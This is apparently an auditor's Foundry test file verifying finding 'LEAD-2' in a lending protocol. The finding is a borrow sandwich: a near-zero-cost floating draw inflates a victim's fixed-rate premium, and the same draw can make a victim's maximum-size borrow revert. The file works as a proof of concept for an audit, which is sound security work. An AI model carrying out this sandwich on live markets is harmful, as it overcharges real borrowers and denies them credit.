// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import { FixedMarket } from "../../../../../../contracts/cap/market/FixedMarket.sol";
import { FloatingMarket } from "../../../../../../contracts/cap/market/FloatingMarket.sol";
import { IBaseMarket } from "../../../../../../contracts/interfaces/IBaseMarket.sol";
import { CapDeployer } from "../../../../../../test/shared/CapDeployer.sol";

/// LEAD-2 independent verification. Same book as the author's PoC (2M reserve, 2.5M credit lines,
/// slopes 5/5/10 kink 0.8, uw 20%, 1h window) so the numbers are comparable.
/// Run: FOUNDRY_TEST=audit/v3/tests/scratch/verify/LEAD-2 forge test --match-path 'audit/v3/tests/scratch/verify/LEAD-2/*' -vv
contract LEAD2_Verify is CapDeployer {
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address lender = makeAddr("lender");
    FloatingMarket fl;
    FixedMarket fx;
    uint256 constant T = 30 days;
    uint256 constant YEAR = 365 days;
    uint256 constant P = 500_000e18;

    function setUp() public {
        CapConfig memory cfg = _defaultCapConfig();
        cfg.applyLiquiditySlopes = true;
        cfg.defaultFixedCreditLimit = 100_000_000e18;
        _deployCapWithConfig(cfg);
        (address m1,,) = _createMarket("float", defaultMarketOwner, attacker);
        fl = FloatingMarket(m1);
        _configureMarketRates(fl);
        (address m2, address t0,) = _createFixedMarket("fixed", defaultMarketOwner, victim);
        fx = FixedMarket(m2);
        _configureMarketRates(FloatingMarket(m2));
        _fundTranche(fl.tranches()[0].tranche, makeAddr("u1"), 5_000_000e18);
        _fundTranche(t0, makeAddr("u2"), 5_000_000e18);
        _depositStable(lender, 2_000_000e18);
        vm.warp(block.timestamp + 3 days);
        irm.updateLiquidityRate();
    }

    // combined annual rate (liq*termMult*marketMult + uw) the fixed market would charge after `mint`
    function _rate(uint256 mint) internal view returns (uint256) {
        (uint256 l, uint256 u) = irm.fixedRatesAfterMint(address(fx), 1e27, mint);
        return l + u;
    }

    function _liqRate(uint256 mint) internal view returns (uint256 l) {
        (l,) = irm.fixedRatesAfterMint(address(fx), 1e27, mint);
    }

    function _quote() internal view returns (uint256 liq, uint256 uw) {
        (liq, uw) = fx.premiumForBorrow(P, T);
    }

    function _prem(uint256 notional, uint256 rate) internal pure returns (uint256) {
        return (notional * T * rate / 1e27) / YEAR;
    }

    /// (a)+(d): decompose the sandwiched overcharge into the two mechanisms. All of it is liquidity premium.
    function test_V1_decomposeSandwichOvercharge() public {
        (uint256 liq0, uint256 uw0) = _quote();
        uint256 rP = _rate(P); // clean: rate at util(P)

        vm.prank(attacker);
        fl.borrow(attacker, 2_000_000e18);
        uint256 C = irm.unsmoothedCredit();
        assertApproxEqAbs(C, 2_000_000e18, 1, "the floating draw is the unsmoothed credit");

        (uint256 liq1, uint256 uw1) = _quote();
        uint256 rCP = _rate(P); // rate at util(C+P)
        uint256 rC = _rate(0); // rate at util(C)

        uint256 overcharge = (liq1 + uw1) - (liq0 + uw0);
        uint256 utilPart = _prem(P, rCP) - _prem(P, rP); // victim priced at util(C+P) instead of util(P)
        uint256 catchUpPart = _prem(C, rCP) - _prem(C, rC); // catch-up on the attacker's notional

        emit log_named_decimal_uint("victim premium clean", liq0 + uw0, 18);
        emit log_named_decimal_uint("victim premium sandwiched", liq1 + uw1, 18);
        emit log_named_decimal_uint("overcharge total", overcharge, 18);
        emit log_named_decimal_uint("  of which: priced at util(C+P) not util(P)", utilPart, 18);
        emit log_named_decimal_uint("  of which: catch-up on floating C", catchUpPart, 18);
        emit log_named_decimal_uint("overcharge in liquidity premium", liq1 - liq0, 18);
        emit log_named_decimal_uint("overcharge in underwriter premium", uw1 - uw0, 18);

        assertApproxEqAbs(utilPart + catchUpPart, overcharge, 10, "two parts account for the whole overcharge");
        assertApproxEqAbs(uw1, uw0, 1, "underwriter premium is unchanged: uw rate is flat, catch-up on it is zero");
        assertApproxEqAbs(liq1 - liq0, overcharge, 1, "the whole surplus is liquidity premium (stcUSD stakers only)");
    }

    /// (b): same-block repay returns exactly what was minted; attacker net zero.
    function test_V2_sameBlockAttackerPaysNothing() public {
        uint256 bal0 = stablecoin.balanceOf(attacker);
        vm.prank(attacker);
        uint256 minted = fl.borrow(attacker, 2_000_000e18);
        vm.prank(victim);
        fx.borrow(victim, P, T);
        vm.prank(attacker);
        uint256 repaid = fl.repay(type(uint256).max);
        assertEq(repaid, minted, "repaid exactly what was minted");
        assertEq(stablecoin.balanceOf(attacker), bal0, "attacker net zero cUSD");
        assertEq(fl.totalDebt(), 0, "line fully released");
    }

    /// (b) stronger: the same-block early return is not the crux. A one-block (12s) hold costs dust and
    /// the victim is repriced almost identically, because the EMA has absorbed ~0.3% of C.
    function test_V3_oneBlockHoldCostsDustAndStillReprices() public {
        _depositStable(attacker, 10e18); // pocket change to cover 12s of interest
        (uint256 liq0, uint256 uw0) = _quote();
        vm.prank(attacker);
        uint256 minted = fl.borrow(attacker, 2_000_000e18);
        (uint256 liqS, uint256 uwS) = _quote(); // same-block quote for comparison

        vm.warp(block.timestamp + 12);
        (uint256 liq1, uint256 uw1) = _quote();
        vm.prank(victim);
        (, uint256 drawn) = fx.borrow(victim, P, T);
        uint256 victimPremium = fx.debt(0) - drawn;

        vm.prank(attacker);
        uint256 repaid = fl.repay(type(uint256).max);
        uint256 attackerCost = repaid - minted;
        vm.warp(block.timestamp + 1); // move off the quote block so the residual is measurable

        emit log_named_decimal_uint("attacker cost for a 12s hold", attackerCost, 18);
        emit log_named_decimal_uint("victim overcharge same-block", (liqS + uwS) - (liq0 + uw0), 18);
        emit log_named_decimal_uint("victim overcharge 12s later", victimPremium - (liq0 + uw0), 18);
        assertLt(attackerCost, 1e18, "sub-1 cUSD cost");
        assertEq(victimPremium, liq1 + uw1, "quote is what the victim paid");
        assertGt(
            victimPremium - (liq0 + uw0),
            ((liqS + uwS) - (liq0 + uw0)) * 99 / 100,
            "still >99% of the same-block overcharge"
        );
    }

    /// (d) corollary: the sandwich also shrinks availableCredit(term); a victim sized off the pre-sandwich
    /// figure reverts. Zero-cost DoS of a max draw.
    function test_V4_sandwichRevertsAVictimSizedBeforeIt() public {
        uint256 sized = fx.availableCredit(T);
        vm.prank(attacker);
        fl.borrow(attacker, 2_000_000e18);
        uint256 sizedAfter = fx.availableCredit(T);
        emit log_named_decimal_uint("availableCredit(30d) before", sized, 18);
        emit log_named_decimal_uint("availableCredit(30d) after sandwich", sizedAfter, 18);
        assertLt(sizedAfter, sized);
        vm.prank(victim);
        vm.expectRevert(IBaseMarket.InsufficientLiquidity.selector);
        fx.borrow(victim, sized, T);
    }

    /// (a) honest case: the +342.47 is purely C*T*(r(C+P)-r(C)); and the floating line does reprice at the
    /// live utilization the moment the fixed draw mints (liquidityRate jumps), so the pot is paid twice for C.
    function test_V5_honestFloatingDrawIsPureCatchUpAndFloatingReprices() public {
        vm.prank(attacker);
        fl.borrow(attacker, 500_000e18);
        (uint256 liqW, uint256 uwW) = _quote();
        uint256 C = irm.unsmoothedCredit();
        uint256 catchUp = _prem(C, _rate(P)) - _prem(C, _rate(0));

        uint256 snap = vm.snapshotState();
        vm.warp(block.timestamp + 2 days);
        irm.updateLiquidityRate();
        (uint256 liqA, uint256 uwA) = _quote();
        assertLt(irm.unsmoothedCredit(), 1e6, "absorbed (wei residual)");
        emit log_named_decimal_uint("quote with C unabsorbed", liqW + uwW, 18);
        emit log_named_decimal_uint("quote with C absorbed", liqA + uwA, 18);
        emit log_named_decimal_uint("difference", (liqW + uwW) - (liqA + uwA), 18);
        emit log_named_decimal_uint("C*T*(r(C+P)-r(C))", catchUp, 18);
        assertApproxEqAbs(
            (liqW + uwW) - (liqA + uwA), catchUp, 10, "the honest overcharge is exactly the catch-up on C"
        );
        vm.revertToState(snap);

        // floating reprices: the live liquidity rate jumps on the fixed mint and the index grows at it
        uint256 rateBefore = irm.liquidityRate();
        vm.prank(victim);
        fx.borrow(victim, P, T);
        uint256 rateAfter = irm.liquidityRate();
        emit log_named_decimal_uint("live liquidity rate before fixed draw", rateBefore, 27);
        emit log_named_decimal_uint("live liquidity rate after fixed draw", rateAfter, 27);
        assertGt(rateAfter, rateBefore, "floating index now accrues at the post-mint utilization");
    }

    /// Control: a FIXED prior draw of the same size charges the second borrower the same catch-up. The
    /// mechanism is generic to unsmoothedCredit; what is specific to floating is (i) the prior does not
    /// lock its rate, so the pot is paid twice, and (ii) the prior can leave for free.
    function test_V6_controlFixedPriorSameCatchUp() public {
        address other = makeAddr("otherFixed");
        (address m3, address t3,) = _createFixedMarket("fixed2", defaultMarketOwner, other);
        _configureMarketRates(FloatingMarket(m3));
        _fundTranche(t3, makeAddr("u3"), 5_000_000e18);
        vm.warp(block.timestamp + 3 days);
        irm.updateLiquidityRate();

        vm.prank(other);
        FixedMarket(m3).borrow(other, 500_000e18, T);
        uint256 C = irm.unsmoothedCredit();
        (uint256 liqW, uint256 uwW) = _quote();
        uint256 catchUp = _prem(C, _rate(P)) - _prem(C, _rate(0));
        uint256 own = _prem(P, _rate(P));
        emit log_named_decimal_uint("prior fixed C (incl. its premium)", C, 18);
        emit log_named_decimal_uint("second borrower's own premium at r(C+P)", own, 18);
        emit log_named_decimal_uint("plus catch-up on prior fixed C", catchUp, 18);
        assertApproxEqAbs(liqW + uwW, own + catchUp, 10, "same formula for fixed prior");
    }

    /// (d): above the kink the overcharge fraction is much larger. Needs a 12.5M floating line against a 2M reserve.
    function test_V7_aboveKinkOverchargeFraction() public {
        _fundTranche(fl.tranches()[0].tranche, makeAddr("u4"), 20_000_000e18);
        vm.warp(block.timestamp + 3 days);
        irm.updateLiquidityRate();
        (uint256 liq0, uint256 uw0) = _quote();
        vm.prank(attacker);
        fl.borrow(attacker, 10_000_000e18);
        (uint256 liq1, uint256 uw1) = _quote();
        emit log_named_decimal_uint("util(C) after 10M draw", irm.averageUtilizationAfterMint(0), 27);
        emit log_named_decimal_uint("victim premium clean", liq0 + uw0, 18);
        emit log_named_decimal_uint("victim premium sandwiched", liq1 + uw1, 18);
        emit log_named_uint("overcharge bps of clean", ((liq1 + uw1) - (liq0 + uw0)) * 10_000 / (liq0 + uw0));
        assertGt(liq1 + uw1, (liq0 + uw0) * 13 / 10, "over +30% above the kink");
    }
}
